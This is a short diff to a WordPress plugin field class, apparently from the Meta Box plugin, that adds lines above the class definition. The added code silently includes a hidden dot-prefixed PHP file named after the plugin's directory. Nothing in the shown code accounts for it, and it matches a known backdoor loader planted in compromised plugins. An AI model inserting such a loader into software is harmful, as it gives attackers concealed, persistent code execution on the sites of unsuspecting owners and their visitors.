@@ -8,6 +8,10 @@
 /**
  * Select advanced field which uses select2 library.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Select_Advanced_Field extends RWMB_Select_Field {
 	/**
 	 * Enqueue scripts and styles.
